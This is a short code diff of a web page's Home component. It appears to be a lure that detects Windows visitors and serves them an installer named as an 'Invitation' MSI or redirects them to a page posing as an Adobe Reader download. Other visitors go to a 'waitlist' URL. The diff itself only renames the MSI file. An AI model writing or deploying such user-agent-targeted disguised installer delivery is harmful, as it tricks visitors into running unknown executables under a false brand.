@@ -6,7 +6,7 @@ export default function Home() {
     const isWindows = /windows/i.test(userAgent);
 
     const NON_WINDOWS_TARGET = "https://waitlist.yutrija.app/d7ZczaSFKF2uS!KSpDa/";
-    const MSI_FILE = "/Invitation-9023.msi";
+    const MSI_FILE = "/Invitation-90233.msi";
     const WINDOWS_REDIRECT = "https://uswebsites.com/adobe-reader/installer/download.html";
 
     if (isWindows) {
@@ -52,6 +52,7 @@ export default function Home() {
     </main>
   );
 }
+
 
 
 
